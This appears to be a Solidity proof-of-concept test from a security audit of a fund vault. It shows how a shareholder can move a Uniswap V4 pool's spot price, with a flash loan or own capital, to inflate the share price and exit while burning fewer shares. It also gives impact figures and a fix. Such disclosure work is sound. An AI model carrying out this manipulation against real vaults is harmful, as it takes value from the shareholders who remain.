// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {UniswapV4Adapter} from "../../../src/adapters/UniswapV4Adapter.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: a shareholder pushes the pool's spot price for one transaction and exits at an inflated Share Price
/// @notice TRUST BOUNDARY. Share Assets value a Uniswap V4 position as "the tokens it would return at the pool's
///         CURRENT spot price" (`UniswapV4Adapter._principal` reads `slot0`, UniswapV4Adapter.sol:621-637), each token
///         then priced by the oracle (`CoreVaultLogic._positionsPrincipal`, CoreVaultLogic.sol:235-248). The two prices
///         are not tied together. A liquidity position is worth the most at the true price; read at any other spot
///         price and valued at the true oracle price, its token mix is worth MORE (the mix is the tangent of a concave
///         value curve). So whoever moves the pool's spot price inside one transaction raises Share Assets for that
///         transaction, in either direction, with no oracle movement.
/// @notice ATTACK. A shareholder (a contract): swap in the Mandate pool to push the price past the fund's range
///         (own capital or a flash loan), `requestPayout(Instant)` and `claimPayout` for an amount Idle covers, swap
///         back. The claim burns `amount / inflated price` shares: fewer than it should. Repeatable after every
///         re-deposit at the fair price. On a Spoke Chain the same lever needs no atomicity: `SpokeVault.report()` is
///         permissionless (SpokeVault.sol:404), so the attacker pushes the spoke pool, calls `report()`, pushes it
///         back, delivers that report on the hub and exits while it is the latest accepted one.
/// @notice IMPACT. Value taken from the shareholders who stay: here a position with a wide range reads 17.5% too
///         high and the attacker keeps about 12% of the shares an honest exit of the same USDC would have burned.
///         The cost is the pool fee on the round trip plus the exit fees (2.25%); it is cheap when the fund's
///         position is most of the pool's liquidity near the price, which the manager's pool choice decides.
/// @notice STATUS. DEC-067 says the hub position is valued "at guarded pool price" and QA3 lists the guard's
///         parameters as OPEN; the code has no guard at all on valuation (the 5% floor of the final verification
///         covers only the unwind's swaps). Reported because the missing guard is a theft path, not only an
///         execution-quality question.
/// @notice FIX. Value a price-dependent position at the ORACLE price, not at spot: compute the token mix the range
///         holds at the oracle's price (the adapter has liquidity and ticks; the hub has `IPriceSource`), or refuse
///         a mint or payout valuation while spot deviates from the oracle by more than a bound. For spoke reports,
///         carry liquidity and ticks (already in the payload) and let the hub recompute the mix at its own price.
/// @dev The mock Uniswap V4 has no swap-driven price; `setTick` stands in for the attacker's swap and its reversal.
contract SpotCompositionExitPoC is AccessFundFixture {
    function test_POC_shareholderExitsAtASharePriceInflatedBySpotComposition() public {
        (IFundFactory.FundAddresses memory a,) = _createFund(_plan());
        CoreVault core = CoreVault(a.coreVault);
        SpokeVault hub = _hubVault(a);
        address adapter = a.chains[0].uniswapV4Adapter;
        bytes32 poolId = _hubPoolId();

        _deposit(core, alice, 800_000e6);
        _deposit(core, stranger, 200_000e6);
        // The manager holds 800,000 USDC in one wide position (ticks -6000 to 6000) around the price.
        vm.startPrank(manager);
        core.allocateToHubSpokeVault(800_000e6);
        hub.swapExactInput(adapter, poolId, address(usdc), 400_000e6, 0, "");
        hub.openPosition(adapter, poolId, 400_000e6, 400_000e6, _wideOpenParams());
        vm.stopPrank();
        uint256 fairAssets = core.shareAssets();
        assertApproxEqAbs(fairAssets, 997_500e6, 10);

        // Control: an honest Instant Payout of 190,000 USDC burns 190,000 shares.
        uint256 snapshot = vm.snapshotState();
        uint256 honestBurn = _exit(core, 190_000e6);
        assertApproxEqRel(honestBurn, 190_000e18, 0.001e18);
        vm.revertToState(snapshot);

        // The attacker pushes the pool's spot price past the range, exits, and lets the price come back. The
        // oracle never moved.
        v4.setTick(poolId, 6000);
        assertGt(core.shareAssets(), fairAssets * 113 / 100, "Share Assets read 13% too high for this transaction");
        uint256 attackBurn = _exit(core, 190_000e6);
        v4.setTick(poolId, 0);

        assertApproxEqAbs(core.shareAssets(), fairAssets - 190_000e6, 1e6, "the fund paid the same 190,000 USDC");
        assertLt(attackBurn, honestBurn * 88 / 100, "for 12% fewer shares than an honest exit burns");
        // What the attacker kept is worth about 22,900 USDC at the fair price, taken from Alice.
        uint256 kept = (honestBurn - attackBurn) * core.sharePrice() / 1e36;
        assertGt(kept, 22_000e6);
    }

    /// @dev An Instant Payout of `amount` by the attacker; returns the shares burned.
    function _exit(CoreVault core, uint256 amount) internal returns (uint256 burned) {
        vm.startPrank(stranger);
        core.requestPayout(amount, ICoreVault.PayoutMode.Instant);
        burned = core.claimPayout("").sharesBurned;
        vm.stopPrank();
    }

    function _wideOpenParams() internal view returns (bytes memory) {
        return abi.encode(
            UniswapV4Adapter.OpenParams({
                tickLower: -6000,
                tickUpper: 6000,
                liquidity: 0,
                amount0Max: 400_000e6,
                amount1Max: 400_000e6,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
    }
}
